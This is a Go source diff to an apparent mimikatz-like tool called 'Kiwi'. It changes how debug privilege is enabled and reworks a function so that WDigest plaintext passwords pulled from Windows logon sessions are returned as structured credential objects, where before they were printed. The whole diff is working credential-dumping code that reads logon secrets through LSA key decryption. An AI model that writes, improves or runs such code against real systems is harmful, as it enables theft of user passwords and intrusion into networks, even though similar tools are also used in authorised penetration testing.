@@ -104,7 +104,7 @@ func (kiwi *Kiwi) EnableDebugPrivilege() error {
 	if kiwi.debug {
 		return nil
 	}
-	err := privilege.EnableDebugPrivilege()
+	_, err := privilege.RtlEnableDebug()
 	if err != nil {
 		return err
 	}
@@ -133,25 +133,21 @@ func (kiwi *Kiwi) GetAllCredential() ([]*Credential, error) {
 	if err != nil {
 		return nil, err
 	}
+	creds := make([]*Credential, 0, len(sessions))
 	for _, session := range sessions {
-		fmt.Println()
-		fmt.Println("Domain:", session.Domain)
-		fmt.Println("Username:", session.Username)
-		fmt.Println("Logon server:", session.LogonServer)
-		fmt.Println("SID:", session.SID)
-		cred, err := kiwi.wdigest.GetPassword(pHandle, session.LogonID)
+		cred := Credential{
+			Session: session,
+			Wdigest: nil,
+		}
+		wdigest, err := kiwi.wdigest.GetPassword(pHandle, session.LogonID)
 		if err != nil {
-			return nil, err
+			kiwi.log(logger.Error, "wdigest:", err)
+		} else {
+			cred.Wdigest = wdigest
 		}
-		if cred == nil {
-			continue
-		}
-		fmt.Println("  wdigest:")
-		fmt.Println("    *Domain:", cred.Domain)
-		fmt.Println("    *Username:", cred.Username)
-		fmt.Println("    *Password:", cred.Password)
+		creds = append(creds, &cred)
 	}
-	return nil, nil
+	return creds, nil
 }
 
 // acquireLSAKeys is used to get keys to decrypt credentials.
